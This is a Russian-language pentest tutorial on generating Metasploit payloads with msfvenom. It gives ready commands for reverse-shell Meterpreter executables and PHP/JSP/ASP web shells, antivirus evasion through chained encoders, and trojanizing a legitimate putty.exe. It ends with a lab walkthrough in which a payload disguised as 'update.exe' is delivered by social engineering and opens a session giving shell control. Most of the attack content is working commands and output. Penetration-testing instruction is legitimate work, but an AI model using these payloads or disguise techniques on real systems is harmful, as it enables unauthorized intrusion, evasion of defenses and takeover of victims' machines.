# Генерация пейлоада через msfvenom

## 1. Место msfvenom в арсенале пентестера

`msfvenom` — штатная утилита командной строки в Metasploit Framework, объединившая функциональность ранее разделённых инструментов `msfpayload` (генерация полезной нагрузки) и `msfencode` (кодирование). С момента появления в 2015 г. она стала основным средством быстрого создания и настройки пейлоадов для эксплуатации уязвимостей на этапе получения начального доступа. Инструмент может генерировать shellcode, исполняемые файлы, скрипты и даже шелл-код в raw-виде под множество платформ и архитектур.

Под **полезной нагрузкой (payload)** в пентесте понимается код, выполняемый на целевой машине после успешной эксплуатации уязвимости. Его задача — предоставить атакующему интерактивный или полуинтерактивный канал управления: командную оболочку, загрузку Meterpreter, выполнение произвольных операций.

Ключевые термины, необходимые для работы с `msfvenom`:

- **Shellcode** — низкоуровневая последовательность машинных инструкций, реализующая соединение; часто выводится в формате raw.
- **Stager** — компактная первая ступень (staged-нагрузка), которая загружает и запускает основную часть (stage) от атакующего.
- **Stage** — основная функциональная часть, например библиотека Meterpreter, передаваемая по установленному каналу.
- **Meterpreter** — продвинутый in-memory-агент Metasploit, работающий без создания файлов на диске; поддерживает миграцию процессов, извлечение хешей, загрузку модулей и т.д.
- **Reverse connection** — целевая система сама инициирует подключение к атакующему (преодолевает NAT, большинство брандмауэров на исходящие соединения).
- **Bind connection** — целевая система открывает порт и ожидает входящего соединения (требует доступности порта извне, легко блокируется фаерволом).

Сравнение этих двух базовых шаблонов соединения приведено в таблице:

| Параметр                | Reverse Shell (обратный)            | Bind Shell (связывающий)            |
|-------------------------|--------------------------------------|--------------------------------------|
| Инициатор соединения    | Целевая машина                       | Атакующий                            |
| Требования к сети       | Исходящий доступ к атакующему (часто разрешён) | Входящий доступ к цели (часто запрещён) |
| Обход NAT               | Цель → Атакующий (публичный IP/LHOST) | Атакующий → Цель (маршрутизация)     |
| Типичное применение     | Пентесты за пределами периметра       | Внутренняя сеть, когда цель доступна напрямую |
| Сложность детекта       | Соединение инициируется легитимным процессом | Открытый порт на необычной машине    |

Все компоненты Metasploit, включая `msfvenom`, активно развиваются Rapid7; официальная документация доступна в разделе [How to use msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). 

Начать знакомство с возможностями утилиты можно с просмотра списка доступных полезных нагрузок:

```bash
msfvenom -l payloads
```

Вывод содержит сотни записей; пример нескольких строк (иллюстративная выборка):

```
Framework Payloads (1097 total) [--payload <value>]
==================================================
    Name                                                Description
    ----                                                -----------
    android/meterpreter/reverse_tcp                     Run a meterpreter server in an Android device
    cmd/unix/reverse_bash                               Run command and send output to a host
    java/meterpreter/reverse_tcp                        Run an embedded Java-based Meterpreter
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged)
    php/meterpreter/reverse_tcp                         Run a Meterpreter shell in a PHP script
    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)
    windows/x64/meterpreter/reverse_https               Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager
    ...
```

Этот перечень показывает кросс-платформенность инструмента и разнообразие видов соединений (reverse_tcp, bind_tcp, reverse_https и др.). Каждый элемент можно использовать в качестве аргумента `-p`, что и будет продемонстрировано далее.

---

## 2. Архитектура полезной нагрузки и опции генерации

### Синтаксис и ключевые параметры

Базовая команда генерации имеет структуру:

```
msfvenom -p <PAYLOAD> [OPTIONS] -f <FORMAT> [-o <outfile>]
```

Обязательные флаги — `-p` (указывает нагрузку) и `-f` (определяет формат вывода). Часто добавляются `LHOST` и `LPORT`, задающие адрес и порт для обратного подключения. Расшифровка основных опций:

| Опция          | Назначение                                                                 | Пример значения              |
|----------------|----------------------------------------------------------------------------|------------------------------|
| `-p`           | Идентификатор полезной нагрузки                                            | `windows/x64/meterpreter/reverse_tcp` |
| `-f`           | Формат выходного файла (`exe`, `elf`, `raw`, `python`, `php`, `asp`, …)   | `exe`                        |
| `-o`           | Сохранить результат в файл                                                | `payload.exe`                |
| `LHOST`        | IP-адрес атакующего (куда цель будет стучаться)                            | `192.168.1.10`               |
| `LPORT`        | Порт слушателя на атакующем                                                | `4444`                       |
| `-e`           | Кодировщик (encoder) для обфускации shellcode                              | `x86/shikata_ga_nai`         |
| `-i`           | Число итераций кодирования (повышает энтропию, усложняет сигнатурный анализ) | `5`                          |
| `-b`           | Исключаемые байты (bad characters), например `\x00\x0a\x0d`                | `\x00`                       |
| `-a`           | Целевая архитектура (`x86`, `x64`, `armle`, …)                             | `x64`                        |
| `--platform`   | Целевая платформа (`windows`, `linux`, `osx`, …)                           | `windows`                    |
| `-x`           | Путь к исполняемому файлу-шаблону, в который будет внедрён пейлоад         | `putty.exe`                  |
| `-k`           | Сохранить поведение шаблона (запустить основную программу вместе с пейлоадом в отдельном потоке) | – (флаг) |
| `-n`           | Размер NOP-саней (sled), добавляемых перед shellcode                       | `16`                         |
| `-s`           | Максимальный размер итоговой нагрузки                                      | `300`                        |
| `--smallest`   | Попытаться создать нагрузку минимально возможного размера                  | – (флаг)                     |

### Именование полезных нагрузок

Идентификатор `PAYLOAD` строится по схеме `платформа/архитектура/тип_нагрузки/способ_подключения`. Например:

- `windows/x64/meterpreter/reverse_tcp` – 64-разрядный Windows Meterpreter с обратным TCP-соединением;
- `linux/x86/shell_reverse_tcp` – обычный обратный шелл для Linux x86;
- `php/meterpreter/reverse_tcp` – Meterpreter в виде PHP-скрипта;
- `android/meterpreter/reverse_https` – нагрузка под Android через HTTPS.

Разнообразие платформ, для которых доступны пейлоады, охватывает Windows, Linux, macOS, Android, iOS, Java, PHP, Python, Ruby и многие другие; полный список можно получить командой `msfvenom --help-platforms`.

### Staged и stageless нагрузки

- **Staged** (многоэтапные) — название обычно содержит `/meterpreter/` или `/shell/`. Результирующий файл мал (от нескольких сотен байт до нескольких КБ), содержит stager, который устанавливает соединение с обработчиком (`multi/handler`) и загружает основную DLL или код. Преимущества: малый размер, гибкость при обновлении stage-нагрузки. Недостаток: требуется стабильное сетевое соединение на этапе загрузки.
- **Stageless** — целиком включает код Meterpreter или шелла, в обозначении обычно добавляется `_` (underscore), например `windows/x64/meterpreter_reverse_tcp`. Файл значительно больше (несколько МБ), но не требует загрузки дополнительных компонентов. Применяется, когда связь может прерываться или нет возможности подтянуть stage.

### Схема взаимодействия

Процесс использования reverse_tcp-пейлоада:

```text
[Атакующий Kali]                        [Целевая система]
   1. msfvenom генерирует payload.exe
   2. msfconsole запускает multi/handler (LISTENING на LHOST:LPORT)
                                         3. payload.exe запускается
                                         4. Инициируется TCP-соединение к атакующему
   5. Handler принимает соединение,
      создаётся сессия (Meterpreter)
```

Для bind-нагрузки атакующий активно соединяется к целевому порту, что отражено на схеме:

```text
[Атакующий Kali]                        [Целевая система]
   1. msfvenom генерирует bind_payload.exe
                                         2. bind_payload.exe открывает порт LPORT
   3. Атакующий подключается к Цель:LPORT
                                         4. Соединение установлено, сессия
```

### Команда с поэтапным разбором

Пример генерации обратного Meterpreter для 64-битной Windows:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443 -f exe -o meterpreter_win64.exe
```

Пояснение:
- `-p windows/x64/meterpreter/reverse_tcp` — staged нагрузка, stager инициирует загрузку DLL Meterpreter;
- `LHOST=10.10.10.5 LPORT=443` — адрес машины атакующего, порт должен быть доступен из целевой сети;
- `-f exe` — выходной Portable Executable;
- `-o meterpreter_win64.exe` — имя сохраняемого файла.

Вывод `msfvenom` при успешном создании содержит информацию о размере, архитектуре и параметрах:

```
[-] No encoder or bad chars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter_win64.exe
```

Эта команда демонстрирует базовый синтаксис, используемый в подавляющем большинстве сценариев. Вариация параметров позволяет настраивать нагрузку под конкретную среду.

---

## 3. Практические приёмы создания и доставки пейлоадов

### Генерация для различных операционных систем

`msfvenom` позволяет создавать исполняемые файлы для многих платформ единообразным образом. Ниже приведены типовые команды:

**Windows (EXE):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

**Linux (ELF):**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf
```

**macOS (Mach-O):**
```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho
```

**Android (APK):**
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
```
(требуется подпись APK для установки; можно использовать `-k` для внедрения в существующий легитимный APK)

**Веб-нагрузки (PHP, JSP, ASP):**
```bash
# PHP-скрипт с Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp
# ASP
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp
```

Выбор формата (`-f`) критичен: `raw` выдаёт чистый код (может быть обёрнут вручную), а `exe` или `elf` создаёт полноценный исполняемый файл.

### Обход антивирусов с помощью кодирования

Сгенерированный без модификаций пейлоад легко детектируется большинством современных антивирусных средств. Простейший способ снизить вероятность обнаружения — применить кодировщик (encoder) с несколькими итерациями.

Пример с полиморфным кодером `shikata_ga_nai`, 5 итераций:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```

- `-e x86/shikata_ga_nai` — один из самых известных полиморфных кодировщиков, генерирует различный shellcode при каждом запуске.
- `-i 5` — пять проходов кодирования; каждая итерация увеличивает энтропию и усложняет жёсткую сигнатуру.

Утилита позволяет конвейерно комбинировать несколько кодировщиков (`pipe`):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 3 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -f exe -o chain_encoded.exe
```

Такой подход, однако, не гарантирует полной необнаруживаемости: современные EDR-решения анализируют поведение, а не только статические сигнатуры. Более продвинутые методы включают внедрение в легитимные процессы, использование кастомных шаблонов и обфускацию строк.

### Использование шаблонов (templates)

Флаг `-x` позволяет внедрить полезную нагрузку в существующий доверенный исполняемый файл. При добавлении `-k` основное приложение продолжит работать параллельно с шеллом, что делает атаку менее заметной.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=443 \
  -x putty.exe -k -f exe -o evil_putty.exe
```

- `-x putty.exe` — в качестве шаблона взят известный SSH-клиент.
- `-k` — сохранить оригинальную функциональность: Putty запускается в основном потоке, а пейлоад — в отдельном.

Применение легитимных цифровых подписей (если шаблон подписан) может дополнительно вводить в заблуждение некоторые средства контроля.

### Настройка слушателя (listener)

Чтобы принять обратное соединение, в Metasploit используется модуль `exploit/multi/handler`. Типичная последовательность в `msfconsole`:

```msf
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

Вывод после запуска:

```
[*] Started reverse TCP handler on 192.168.1.10:4444
[*] Sending stage (200262 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.20:49158)
```

Для проверки связности и тестирования пейлоада в лабораторных условиях часто используют Netcat:

```bash
# Запуск прослушивания на атакующем
nc -lvp 4444
```

Но такой приём подходит лишь для простых шеллов, Meterpreter требует полноценного обработчика.

### Быстрый старт с MSFPC

Для упрощения генерации можно применять надстройку [MSFvenom Payload Creator (MSFPC)](https://github.com/g0tmi1k/msfpc). Она предоставляет интерактивное меню, избавляя от запоминания полного синтаксиса:

```bash
msfpc windows interactive
```

После выбора платформы скрипт запросит IP и порт, создаст исполняемый файл и сразу предложит команду для запуска обработчика.

### Типичные ошибки и подводные камни

- **Неверный `LHOST`**: адрес должен быть доступен с целевой машины. В лабораторных сетях часто используют IP интерфейса, через который установлена связность (например, `eth0` в NAT или host-only сети). Проверить можно командой `ip a` или `ifconfig`.
- **Блокировка порта**: многие корпоративные брандмауэры разрешают исходящие только на стандартные порты (80, 443, 53). Рекомендуется выбирать `LPORT=443`, если нет ограничений.
- **Несоответствие архитектуры**: попытка запустить 64-битную нагрузку на 32-битной системе приведёт к ошибке. Перед генерацией следует уточнить разрядность ОС цели.
- **Обнаружение антивирусом**: не кодированный пейлоад детектируется сигнатурно. Рекомендуется тестировать на VirusTotal (с осторожностью, не загружая чувствительные нагрузки в публичные сервисы) и применять дополнительные методы обхода.
- **Размер нагрузки**: некоторые шаблоны или ограничения ограничивают пространство для shellcode (`-s`). Если не вмещается, можно попробовать `--smallest` или изменить кодировщик.

---

## 4. Сквозной практический пример: от команды `msfvenom` к Meterpreter-сессии

### Исходные условия

- Атакующая машина: Kali Linux с IP-адресом 192.168.1.10 (интерфейс подключён к лабораторному сегменту).
- Целевая система: Windows 10 Pro 22H2 (x64) с IP 192.168.1.20, сетевой экран разрешает исходящие соединения, Windows Defender отключён для демонстрации (в реальных тестах потребуются методы обхода).
- Задача: получить интерактивный доступ через Meterpreter, используя обратный TCP-пейлоад.

### Шаг 1. Генерация исполняемого файла пейлоада

Выполняем команду на Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o update.exe
```

Вывод в терминале:

```
[-] No encoder or bad chars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: update.exe
```

Получен файл `update.exe` размером около 7 КБ. Он не закодирован, поэтому будет обнаружен антивирусом, но для лабораторной демонстрации это допустимо.

### Шаг 2. Запуск обработчика в Metasploit

Открываем `msfconsole` и настраиваем multi/handler:

```msf
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
LHOST => 192.168.1.10
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.10:4444
```

Обработчик ожидает входящего соединения.

### Шаг 3. Доставка полезной нагрузки на целевую машину

На атакующем хосте организуем раздачу файла через встроенный HTTP-сервер Python (или Apache, предварительно скопировав `update.exe` в `/var/www/html/`):

```bash
cd /path/to/payload && python3 -m http.server 8000
```

На целевой машине предполагается, что пользователь загрузит файл, перейдя по ссылке `http://192.168.1.10:8000/update.exe` (например, через социальную инженерию). Для лабораторного теста просто открываем браузер на Windows и скачиваем/запускаем.

### Шаг 4. Установление соединения и работа с сессией

После двойного клика по `update.exe` на Windows 10 к обработчику поступает соединение; в консоли Metasploit видим:

```
[*] Sending stage (200262 bytes) to 192.168.1.20
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.20:49158) at 2025-03-20 12:05:03 +0300
```

Сессия Meterpreter создана. Подключаемся и выполняем базовые команды:

```msf
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-SB3V4KL
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: DESKTOP-SB3V4KL\user
meterpreter > shell
Process 4412 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2486]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user\Downloads>whoami
desktop-sb3v4kl\user
```

Получен полный интерактивный контроль над системой. Пример показывает полный цикл: от команды `msfvenom` до активного управления целевой машиной с помощью Meterpreter.

### Вывод по примеру

Сценарий иллюстрирует, что `msfvenom` позволяет за считанные секунды создать рабочий пейлоад, который при доставке на цель и настроенном обработчике обеспечивает надежный канал управления. На практике такой подход требует дополнительных мер по обходу средств защиты, но фундамент получения начального доступа остаётся неизменным.

---

## Источники

- [Удобные шпаргалки по Msfvenom / Хабр](https://habr.com/ru/companies/otus/articles/836096)
- [MSFvenom Payload Creator (MSFPC) – GitHub](https://github.com/g0tmi1k/msfpc)
- [Creating Payload Using msfvenom and Setting up a Listener – Medium](https://medium.com/@zendpushkar/creating-payload-using-msfvenom-and-setting-up-a-listener-for-exploitation-42bfae151800)
- [Generating a shell payload using msfvenom – O’Reilly](https://www.oreilly.com/library/view/practical-web-penetration/9781788624039/5b60c58f-b074-4752-9e2d-51b2dc80f18b.xhtml)
- [Payload Generation with MSFvenom – Pluralsight](https://www.pluralsight.com/courses/payload-generation-msfvenom)
- [The Payload Generator – Metasploit Documentation](https://docs.rapid7.com/metasploit/the-payload-generator)
- [How MSFvenom Powers Penetration Tests – Raxis](https://raxis.com/blog/cool-tools-series-msfvenom)
- [Msfvenom Payloads – CompTIA Security+ Lab](https://www.101labs.net/comptia-security/lab-74-creating-metasploit-payloads-with-msfvenom)
- [How to use msfvenom – Metasploit Documentation (adfoster-r7)](https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [MSFvenom Payload Creator (MSFPC) – GeeksforGeeks](https://www.geeksforgeeks.org/linux-unix/msfvenom-payload-creator-msfpc-installation-and-usage-in-kali-linux)